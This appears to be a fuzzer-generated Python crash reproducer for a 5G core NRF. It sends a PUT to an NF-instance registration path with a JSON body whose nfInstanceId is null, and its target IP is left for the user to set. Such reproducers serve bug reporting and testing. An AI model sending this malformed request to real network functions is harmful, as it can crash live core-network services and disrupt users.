#!/usr/bin/env python3
# Crash reproduction for nrf (low)
# Detected: Sat May  9 02:59:50 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/NRF-fuzz-1226'
body = b'{"nfInstanceId": null, "nfType": "AMF", "nfStatus": "REGISTERED", "ipv4Addresses": ["172.25.0.20"], "fqdn": "amf.oai.local", "priority": 1, "capacity": 100, "load": 0, "nfServices": [{"serviceInstanceId": "namf-comm-001", "serviceName": "namf-comm", "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}], "scheme": "http", "nfServiceStatus": "REGISTERED", "ipEndPoints": [{"ipv4Address": "172.25.0.20", "port": 8080}]}]}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
